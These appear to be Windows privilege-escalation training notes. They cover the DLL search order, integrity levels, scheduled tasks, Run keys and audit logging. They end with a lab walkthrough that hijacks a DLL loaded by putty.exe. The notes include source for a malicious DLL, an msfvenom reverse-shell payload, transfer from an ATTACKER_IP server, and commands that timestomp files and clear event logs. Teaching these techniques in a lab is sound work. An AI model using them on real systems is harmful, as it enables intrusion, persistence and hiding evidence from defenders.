

Modes & Levels
Kernel Mode vs User Mode
Privileged vs Unprivileged


Windows Access Control Model:

1.Access Tokens
Security Identifier (SID) associations and Token associations

2.Security Descriptors
DACL
SACL
ACEs

DLL Search Order
Executables check the following locations (in successive order):

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs
The directory the the Application was run from
The directory specified in in the C+ function GetSystemDirectory()
The directory specified in the C+ function GetWindowsDirectory()
The current directory


DLL Search Order
DLL Hijacking is a technique in which an attacker abuses Window’s Dynamic-Link Library (DLL) Search Order to trick a program into running a custom DLL that executes malicious code.
Dynamic-Link Libraries are libraries of additional functions for a program. They allow for a programmer to not have to recreate commonly used functions by making a program call them. The following steps are used to search for DLL’s when called by a program.
The program checks the following registry location and will attempt to use the last known location of the DLL
reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs"
If the DLL is not found the program will check the following locations, in order:
The directory the the Application was run from
The exact location on the hard drive where the program was executed from. Even locations such as C:\Users\Public\Downloads
The directory specified in in the C+ function GetSystemDirectory()
The returned location is C:\Windows\system32 even on 64 bit systems.
The directory specified in the C+ function GetWindowsDirectory()
The returned location should always be C:\Windows
The current directory
The current directory assuming the application was executed using its full path.


LAST KNOWN DLL LOCATION
reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs"



Windows Integrity Mechanism
Integrity Levels
UNTRUSTED
Anonymous SID access tokens
LOW
Everyone SID access token (World)
MEDIUM
Authenticated Users
HIGH
Administrators
SYSTEM
System services (LocalSystem, LocalService, NetworkService)


DEMO: Checking UAC Settings
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System


AutoElevate Executables
Requested Execution Levels:

asInvoker

highestAvailable


Scheduled Tasks & Services
Items to evaluate include:


Write Permissions
Non-Standard Locations
Unquoted Executable Paths
Vulnerabilities in Executables
Permissions to Run As SYSTEM


Finding vulnerable Scheduled Tasks
schtasks /query /fo LIST /v


 Finding Vulnerable Services
wmic service list full
sc query


Registry
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\
Run
RunOnce

HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\
Run
RunOnce

What are the differences?
Do you need to blend in?

System usage
Where should you run commands from?
Locally?
Remote?
Are system resources a important, and how can we check them?
wmic
net
netstat

Audit Logging
Show all audit category settings
auditpol /get /category:*
What does the below command show?
auditpol /get /category:* | findstr /i "success failure"

mportant Microsoft Event IDs
4624/4625
Successful/failed login
4720
Account created
4672
Administrative user logged on
7045
Service created

Event Logging
Storage: c:\windows\system32\config\

File-Type: .evtx/.evt

wevtutil el
wmic ntevent where "logfile="<LOGNAME>" list full
Get-Eventlog -List

Additional Logging
Determine PS version (bunch of ways)
reg query hklm\software\microsoft\powershell\3\powershellengine\

powershell -command "$psversiontable"
Determine if logging is set (PowerShell and WMIC)
reg query [hklm or hkcu]\software\policies\microsoft\windows\powershell
reg query hklm\software\microsoft\wbem\cimom \| findstr /i logging
# 0 = no | 1 = errors | 2 = verbose
WMIC Log Storage
%systemroot%\system32\wbem\Logs\

Manipulating Logs and Files
Find Files and Alter File attributes
forfiles /P c:\windows\system32 /S /D +05/14/2019
wmic datafile where name='c:\\windows\\system32\\notepad.exe' get CreationDate, LastAccessed, LastModified
copy /b filename.ext +,,
$(Get-Item file.ext).lastaccesstime=$(date) |$(Get-Item test.txt).lastaccesstime=$(Get-Date "07/07/2004")

Clear Event Logs (produces logging!):
wevtutil clear-log Application
Clear-Eventlog -Log Application, System


--------------------------------------------------------------------------------------------------------------------------------------------
auditpol /get /category:*
    # Basic: Shows all audit category setting

auditpol /get /category:* |findstr /i "success failure"
    # Show all audit category set for success, failure, or success and fail

auditpol /list /subcategory:"detailed Tracking","DS Access"
    # Displays sub policy's for "Detailed Tracking","DS Access" categories.

auditpol /get /option:crashonauditfail
    # Check options that effect the system as a whole when certain events occur. The example would cause the system to crash if auditing would become unable to log 




CHECK FOR POWERSHELL LOGGGING/ POWERSHELL VERSION

reg query [hklm or hkcu]\software\microsoft\powershell\1\powershellengine\
    # Hive check to determine PowerShell verison and log settings

reg query [hklm or hkcu]\software\microsoft\powershell\3\powershellengine\
    # PowerShell hive check



-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

The following commands can be used to idenitfy vulnerable tasks using CMD and PowerShell:

schtasks /query /fo LIST /v

List all Tasks in List format

schtasks /query /fo LIST /v | Select-String -Pattern "STRING OR REGEX PATTERN"

Select-String can utilize regex to output only values that match

schtasks /query /fo LIST /v | Select-String -Pattern "Task To Run" -CaseSensitive -Context 0,6

Searches for Task To Run and outputs that line, along with the 6 lines following it in order to show the Run As User setting too.

schtasks /query /fo LIST /v | Select-String -Pattern "Task To Run" -CaseSensitive |Select-String -Pattern "COM handler" -NotMatch

Excludes results that we dont want to seein order to help narrow down vulnerable directory locations

Open and view tasks from the Task Scheduler GUI Application

Identify the following vulnerable Task:

C:\Users\student\exercise_2\putty.exe

Run: sigcheck c:\users\student\exercise_2\putty.exe

Determines information we can use to research for vulnerabilities

Run: icacls "c:\users\student\exercise_2"

Check if the directory can be written to, as it is non-standard


Process Monitor

Run: procmon /AcceptEula

Run: C:\Users\student\exercise_2\putty.exe

Configure the following filters by pressing CTRL + L to open the filter menu:

Process Name contains putty.exe

Path contains .dll

Result is NAME NOT FOUND

procmonputty


As you can see ntmarta.dll is identified. As procmon requires Admin privileges, ways to perform testing can be locally within a development/lab environment.

Creating Malicious DLL
Since we can see that it is trying load a .dll that is not present, and that the directory where putty.exe is located is writable and non-standard we can create a malicious DLL.

Create bad.c and specify desired commands the execute via WinExec():

nano bad.c

#include <windows.h>
int execCommand()
{
 WinExec("cmd /C whoami > FINDME_1.txt", 1);
 return 0;
}
BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
 execCommand();
 return 0;
}
Install all of the programs required to build Windows Portable Executable (PE) files:

apt-get install mingw-w64 mingw-w64-common mingw-w64-i686-dev mingw-w64-tools mingw-w64-tools mingw-w64-x86-64-dev -y

Compiles the raw C source code in bad.c into a unlinked c object name bad.o:

i686-w64-mingw32-g++ -c bad.c -o bad.o

The -Wl, Creates a shared object (a DLL) from source.o named bad.dll. It also creates an import library name bad.a for the DLL which isn’t used for this exploit:

i686-w64-mingw32-g++ -shared -o bad.dll bad.o -Wl,--out-implib,bad.a

Alternative method for DLL creation using MSFVenom

msfvenom -p windows/shell_reverse_tcp LHOST=10.50.x.x LPORT=4444 -f dll > bad.dll

Once the malicious dll has been createdit must be uploaded to the host. Use scp, ftp, nc, python simple HTTP server, or copying and pasting base64 dump of file.

Transfering the DLL
Once the malicious dll has been created, it must be uploaded to the host. Use of scp, ftp, nc, python simple HTTP server, or copying base64 output.

Transfer the DLL to the target machine using one of the following methods:

Create a Simple HTTP server, and then browse to it from the target

On Machine with DLL: python -m SimpleHTTPServer 8000

On Target: Browse to http://ATTACKER_IP:8000

base64 encode the .dll and copy/paste to the target

On Machine with DLL: base64 bad.dll > base64dll

Copy and paste the entire text of the encoded base64dll file

On Target:

Paste the contents of base64dll into base64.txt

Run: move base64.txt base64

Run: certutil -decode base64 ntmarta.dll

Put the retrieved DLL in the same location as the vulnerable Putty executable

Run: copy "PATH OF MALICIOUS DLL" "c:\users\student\exercise_2\ntmarta.dll"

Allow for Putty to execute with scheduled task

If the above steps were followed, a command prompt or two will flash on the screen, and a text file will be created in the same location where putty is.


